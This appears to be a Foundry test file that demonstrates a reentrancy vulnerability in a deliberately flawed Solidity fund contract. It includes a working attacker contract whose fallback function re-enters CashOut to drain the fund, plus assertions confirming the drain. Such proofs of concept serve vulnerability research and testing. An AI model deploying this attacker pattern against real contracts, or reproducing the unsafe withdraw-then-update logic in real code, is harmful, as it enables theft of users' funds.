// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

// Minimal Log contract implementation
contract Log {
    struct Msg {
        address Sender;
        uint Time;
        uint Val;
        string Data;
    }
    Msg public LastMsg;
    Msg[] public History;

    function AddMessage(address _adr, uint _val, string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}

contract ETH_FUND {
    mapping(address => uint256) public balances;
    uint256 public lastBlock;
    Log public TransferLog;

    constructor(address _log) {
        TransferLog = Log(_log);
    }

    function Deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function CashOut(uint _am) public payable {
        if(_am <= balances[msg.sender] && block.number > lastBlock) {
            (bool success, ) = payable(msg.sender).call{value: _am}("");
            if(success) {
                unchecked {
                    balances[msg.sender] -= _am;
                }
                TransferLog.AddMessage(msg.sender, _am, "CashOut");
            }
        }
    }
}

contract MaliciousAttacker {
    ETH_FUND public fund;
    uint256 public attackCount;
    uint256 public amount;

    constructor(ETH_FUND _fund) payable {
        fund = _fund;
    }

    function deposit() external payable {
        fund.Deposit{value: msg.value}();
    }

    function initiateAttack(uint256 _amount) external {
        amount = _amount;
        fund.CashOut(_amount);
    }

    fallback() external payable {
        if (attackCount < 1 && address(fund).balance >= amount) {
            attackCount++;
            fund.CashOut(amount);
        }
    }
}

contract ETH_FUNDTest is Test {
    ETH_FUND public fund;
    MaliciousAttacker public attacker;
    Log public logger;

    function setUp() public {
        logger = new Log();
        fund = new ETH_FUND(address(logger));
        attacker = new MaliciousAttacker{value: 1 ether}(fund);
    }

    function testReentrancyAttack() public {
        // DEPOSIT: Attacker deposits 1 ETH FROM THEIR OWN BALANCE
        hoax(address(attacker), 1 ether); // Sets caller to attacker & value to 1 ether taken from attacker's balance
        attacker.deposit{value: 1 ether}();
        
        // Advance blocks to satisfy lastBlock condition
        vm.roll(block.number + 10);

        // --- BEFORE-Trigger: State snapshot ---
        uint fundBalanceBefore = address(fund).balance;
        uint attackerEthBefore = address(attacker).balance;
        uint attackerTokenBalBefore = fund.balances(address(attacker));
        uint attackCountBefore = attacker.attackCount();
        
        console.log("--- BEFORE-Trigger ---");
        console.log("Fund ETH balance:    ", fundBalanceBefore);
        console.log("Attacker ETH balance:", attackerEthBefore);
        console.log("Attacker token bal:  ", attackerTokenBalBefore);
        console.log("Attack count:        ", attackCountBefore);

        console.log("--- Trigger: initiateAttack(0.5 ether) ---");
        attacker.initiateAttack(0.5 ether);

        // --- AFTER-Trigger: State snapshot ---
        uint fundBalanceAfter = address(fund).balance;
        uint attackerEthAfter = address(attacker).balance;
        uint attackerTokenBalAfter = fund.balances(address(attacker));
        uint attackCountAfter = attacker.attackCount();
        
        console.log("--- AFTER-Trigger ---");
        console.log("Fund ETH balance:    ", fundBalanceAfter);
        console.log("Attacker ETH balance:", attackerEthAfter);
        console.log("Attacker token bal:  ", attackerTokenBalAfter);
        console.log("Attack count:        ", attackCountAfter);

        // --- Differential Comparison ---
        console.log("--- Result ---");
        console.log("Fund balance reduced by:    ", fundBalanceBefore - fundBalanceAfter);
        console.log("Attacker ETH claimed:      ", attackerEthAfter - attackerEthBefore);
        console.log("Attacker token reduction:  ", attackerTokenBalBefore - attackerTokenBalAfter);
        console.log("Attack count increasing:   ", attackCountAfter - attackCountBefore);

        // Vulnerability verdict
        bool isVulnerableDetected = (fundBalanceAfter == 0) &&
            (attackerEthAfter - attackerEthBefore == 1 ether) &&
            (attackCountAfter - attackCountBefore == 1);
        
        if (isVulnerableDetected) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained funds");
        } else {
            console.log("Vulnerability not Exist: No abnormal state changes detected");
        }

        // Final checks aligned with corrected balance dynamics
        assertEq(address(fund).balance, 0, "Fund should be drained");
        assertEq(address(attacker).balance, 1 ether, "Attacker should have 1 ETH (2 withdrawn - 1 deposited)");
    }
}